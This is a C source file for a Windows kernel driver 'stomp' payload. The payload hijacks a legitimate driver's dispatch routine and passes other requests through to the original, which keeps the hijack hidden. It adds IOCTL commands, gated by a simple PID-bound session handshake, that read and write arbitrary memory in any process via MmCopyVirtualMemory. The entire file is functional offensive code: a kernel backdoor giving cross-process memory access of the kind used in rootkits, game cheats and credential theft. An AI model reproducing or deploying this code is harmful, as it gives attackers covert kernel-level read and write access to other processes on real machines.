// Driver2Stomp.c — image-backed stomp payload (WDK 10.0.26100, link /ENTRY:StompThunkEntry)
// STOMP_DATA (.stompdata): +0x00 origDispatch, +0x08 fnGetRoutine, +0x10 fnMmCopyVirtualMemory
//   +0x18 sweepMask, +0x1C magic 'STM2' (0x324D5453)
#include <ntifs.h>

#define IOCTL_SESSION_AUTH      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x870, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_READ_PROCESS_MEM  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_BUFFERED, FILE_READ_DATA)
#define IOCTL_WRITE_PROCESS_MEM CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_BUFFERED, FILE_WRITE_DATA)
#define STM2_MAGIC              0x324D5453u
#ifdef DRIVER2_STOMP_LAB_MIN
#define MAX_RW_BYTES            (16 * 1024)
#else
#define MAX_RW_BYTES            (64 * 1024)
#endif

#pragma pack(push, 1)
typedef struct _PROC_READ_REQ {
    ULONG64 ProcessId;
    ULONG64 Address;
    ULONG32 Size;
    ULONG32 Pad;
} PROC_READ_REQ, *PPROC_READ_REQ;

typedef struct _PROC_WRITE_REQ {
    ULONG64 ProcessId;
    ULONG64 Address;
    ULONG32 Size;
    ULONG32 Pad;
    UCHAR Data[1];
} PROC_WRITE_REQ, *PPROC_WRITE_REQ;
#pragma pack(pop)

#pragma pack(push, 1)
typedef struct _STOMP_DATA {
    PVOID origDispatch;
    PVOID fnGetRoutine;
    PVOID fnMmCopyVirtualMemory;
    ULONG sweepMask;
    ULONG magic;
    volatile LONG init;
    ULONG64 sessionToken;
    ULONG_PTR authPid;
    PVOID fnPsLookupProcess;
    PVOID fnObDeref;
    PVOID fnGetPid;
    PVOID fnPsGetCurrentProcess;
    PVOID fnStackAttach;
    PVOID fnUnstackDetach;
    PVOID fnIoComplete;
} STOMP_DATA, *PSTOMP_DATA;
#pragma pack(pop)

#pragma section(".stompdata", read, write)
__declspec(allocate(".stompdata")) STOMP_DATA g_sd;
#pragma comment(linker, "/SECTION:.stompdata,RW")

typedef PVOID(NTAPI* PFN_GETRT)(PUNICODE_STRING SystemName);
typedef NTSTATUS(NTAPI* PFN_LOOKUP)(HANDLE, PEPROCESS*);
typedef PEPROCESS(NTAPI* PFN_CURPROC)(VOID);
typedef HANDLE(NTAPI* PFN_GETPID)(VOID);
typedef VOID(NTAPI* PFN_DEREF)(PVOID);
typedef VOID(NTAPI* PFN_ATTACH)(PEPROCESS, PKAPC_STATE);
typedef VOID(NTAPI* PFN_DETACH)(PKAPC_STATE);
typedef NTSTATUS(NTAPI* PFN_MMCOPY)(PEPROCESS, PVOID, PEPROCESS, PVOID, SIZE_T, KPROCESSOR_MODE, PSIZE_T);
typedef VOID(NTAPI* PFN_IOCOMPLETE)(PIRP, CCHAR);
typedef NTSTATUS(NTAPI* PFN_DISPATCH)(PDEVICE_OBJECT, PIRP);

static ULONG64 MixSessionToken(ULONG64 challenge, ULONG_PTR pid)
{
    ULONG64 x = challenge ^ (ULONG64)pid ^ 0xC0FFEE5EEDBEE5ULL;
    x ^= x >> 33;
    x *= 0xff51afd7ed558ccdULL;
    x ^= x >> 33;
    x *= 0xc4ceb9fe1a85ec53ULL;
    x ^= x >> 33;
    if (x == 0) x = 1;
    return x;
}

static VOID ResolveExport(PVOID* out, PCWSTR name)
{
    PFN_GETRT get = (PFN_GETRT)g_sd.fnGetRoutine;
    if (!get || !out) return;
    UNICODE_STRING u;
    RtlInitUnicodeString(&u, name);
    *out = get(&u);
}

static VOID InitPointers(VOID)
{
    ResolveExport(&g_sd.fnPsLookupProcess, L"PsLookupProcessByProcessId");
    ResolveExport(&g_sd.fnObDeref, L"ObDereferenceObject");
    ResolveExport(&g_sd.fnGetPid, L"PsGetCurrentProcessId");
    ResolveExport(&g_sd.fnPsGetCurrentProcess, L"PsGetCurrentProcess");
    ResolveExport(&g_sd.fnStackAttach, L"KeStackAttachProcess");
    ResolveExport(&g_sd.fnUnstackDetach, L"KeUnstackDetachProcess");
    ResolveExport(&g_sd.fnIoComplete, L"IoCompleteRequest");
    if (!g_sd.fnMmCopyVirtualMemory && g_sd.fnGetRoutine) {
        ResolveExport(&g_sd.fnMmCopyVirtualMemory, L"MmCopyVirtualMemory");
    }
}

static NTSTATUS CompleteIrp(PIRP irp, NTSTATUS st, ULONG_PTR info)
{
    irp->IoStatus.Status = st;
    irp->IoStatus.Information = info;
    if (g_sd.fnIoComplete)
        ((PFN_IOCOMPLETE)g_sd.fnIoComplete)(irp, IO_NO_INCREMENT);
    else
        IoCompleteRequest(irp, IO_NO_INCREMENT);
    return st;
}

static VOID LazyInit(VOID)
{
    if (InterlockedCompareExchange(&g_sd.init, 1, 0) != 0)
        return;
    if (g_sd.magic != STM2_MAGIC) {
        InterlockedExchange(&g_sd.init, -1);
        return;
    }
    InitPointers();
    (void)g_sd.sweepMask;
    InterlockedExchange(&g_sd.init, 2);
}

static BOOLEAN SessionOk(PIRP irp)
{
    if (g_sd.init < 2 || !g_sd.authPid) return FALSE;
    PEPROCESS req = IoGetRequestorProcess(irp);
    if (!req) return FALSE;
    return (ULONG_PTR)PsGetProcessId(req) == g_sd.authPid;
}

static NTSTATUS CopyMem(HANDLE pid, PVOID targetVa, PVOID buffer, SIZE_T size, BOOLEAN write)
{
    PFN_LOOKUP lookup = (PFN_LOOKUP)g_sd.fnPsLookupProcess;
    PFN_DEREF deref = (PFN_DEREF)g_sd.fnObDeref;
    if (!lookup || !deref) return STATUS_NOT_SUPPORTED;

    PEPROCESS target = NULL;
    NTSTATUS st = lookup(pid, &target);
    if (!NT_SUCCESS(st)) return st;

    PFN_MMCOPY copy = (PFN_MMCOPY)g_sd.fnMmCopyVirtualMemory;
    if (copy && g_sd.fnPsGetCurrentProcess) {
        SIZE_T done = 0;
        PEPROCESS self = ((PFN_CURPROC)g_sd.fnPsGetCurrentProcess)();
        st = copy(write ? self : target, write ? buffer : targetVa,
            write ? target : self, write ? targetVa : buffer,
            size, KernelMode, &done);
        deref(target);
        return st;
    }

    deref(target);
    return STATUS_NOT_SUPPORTED;
}

static NTSTATUS StompDispatch(PDEVICE_OBJECT dev, PIRP irp)
{
    PIO_STACK_LOCATION sp = IoGetCurrentIrpStackLocation(irp);
    ULONG code = sp->Parameters.DeviceIoControl.IoControlCode;

    LazyInit();

    if (code == IOCTL_SESSION_AUTH) {
        if (sp->Parameters.DeviceIoControl.InputBufferLength < sizeof(ULONG64))
            return CompleteIrp(irp, STATUS_INVALID_PARAMETER, 0);
        ULONG64 challenge = *(ULONG64*)irp->AssociatedIrp.SystemBuffer;
        if (!challenge) return CompleteIrp(irp, STATUS_INVALID_PARAMETER, 0);
        if (!g_sd.fnGetPid) return CompleteIrp(irp, STATUS_DEVICE_NOT_READY, 0);
        g_sd.authPid = (ULONG_PTR)PsGetProcessId(IoGetRequestorProcess(irp));
        g_sd.sessionToken = MixSessionToken(challenge, g_sd.authPid);
        if (sp->Parameters.DeviceIoControl.OutputBufferLength >= sizeof(ULONG64)) {
            RtlCopyMemory(irp->AssociatedIrp.SystemBuffer, &g_sd.sessionToken, sizeof(ULONG64));
            return CompleteIrp(irp, STATUS_SUCCESS, sizeof(ULONG64));
        }
        return CompleteIrp(irp, STATUS_SUCCESS, 0);
    }

    if (!SessionOk(irp))
        return CompleteIrp(irp, STATUS_ACCESS_DENIED, 0);

    if (code == IOCTL_READ_PROCESS_MEM) {
        PPROC_READ_REQ req = (PPROC_READ_REQ)irp->AssociatedIrp.SystemBuffer;
        if (sp->Parameters.DeviceIoControl.InputBufferLength < sizeof(PROC_READ_REQ) || !req->Size ||
            req->Size > sp->Parameters.DeviceIoControl.OutputBufferLength || req->Size > MAX_RW_BYTES)
            return CompleteIrp(irp, STATUS_INVALID_PARAMETER, 0);
        NTSTATUS st = CopyMem((HANDLE)(ULONG_PTR)req->ProcessId,
            (PVOID)(ULONG_PTR)req->Address, irp->AssociatedIrp.SystemBuffer, req->Size, FALSE);
        return CompleteIrp(irp, st, NT_SUCCESS(st) ? req->Size : 0);
    }

#ifndef DRIVER2_STOMP_LAB_MIN
    if (code == IOCTL_WRITE_PROCESS_MEM) {
        ULONG hdr = (ULONG)FIELD_OFFSET(PROC_WRITE_REQ, Data);
        if (sp->Parameters.DeviceIoControl.InputBufferLength < hdr)
            return CompleteIrp(irp, STATUS_BUFFER_TOO_SMALL, 0);
        PPROC_WRITE_REQ req = (PPROC_WRITE_REQ)irp->AssociatedIrp.SystemBuffer;
        if (!req->Size || req->Size > sp->Parameters.DeviceIoControl.InputBufferLength - hdr ||
            req->Size > MAX_RW_BYTES)
            return CompleteIrp(irp, STATUS_INVALID_PARAMETER, 0);
        NTSTATUS st = CopyMem((HANDLE)(ULONG_PTR)req->ProcessId,
            (PVOID)(ULONG_PTR)req->Address, req->Data, req->Size, TRUE);
        return CompleteIrp(irp, st, 0);
    }
#endif

    if (g_sd.origDispatch && (PFN_DISPATCH)g_sd.origDispatch != StompDispatch)
        return ((PFN_DISPATCH)g_sd.origDispatch)(dev, irp);

    return CompleteIrp(irp, STATUS_INVALID_DEVICE_REQUEST, 0);
}

NTSTATUS StompThunkEntry(PDEVICE_OBJECT dev, PIRP irp)
{
    return StompDispatch(dev, irp);
}